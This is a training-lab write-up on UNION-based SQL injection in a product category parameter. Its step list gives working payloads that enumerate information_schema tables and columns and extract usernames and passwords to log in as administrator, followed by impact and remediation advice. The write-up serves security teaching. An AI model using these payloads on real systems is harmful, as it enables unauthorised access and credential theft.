
# SQL injection attack, listing the database contents on non-Oracle databases

## 1. Vulnerability

**SQL Injection — Database Enumeration**

The product category parameter allows UNION-based SQL injection, enabling an attacker to enumerate database tables, columns, and user credentials.

## 2. Objective

Enumerate the database structure, retrieve user credentials, and log in as `administrator`.

## 3. Exploitation

1. Intercept the product category request using Burp Suite.
2. Determine that the query returns two text-compatible columns:

`'+UNION+SELECT+'abc','def'--`

3. Enumerate the database tables:

`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

4. Identify the table containing user credentials.
5. Enumerate its columns:

`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`

6. Retrieve the usernames and passwords:

`'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`

7. Use the `administrator` password to log in.
8. Lab solved.

## 4. Impact

Database enumeration through SQL injection can allow attackers to:

* Discover database structure.
* Retrieve usernames and passwords.
* Access sensitive application data.
* Compromise privileged accounts.

## 5. Remediation

* Use **parameterized queries / prepared statements**.
* Apply least-privilege database permissions.
* Protect sensitive credential data.
* Do not expose database errors or internal structure.

## 6. Key Takeaway

**Once SQL injection is achieved, database metadata can be used to systematically discover and extract sensitive information.**
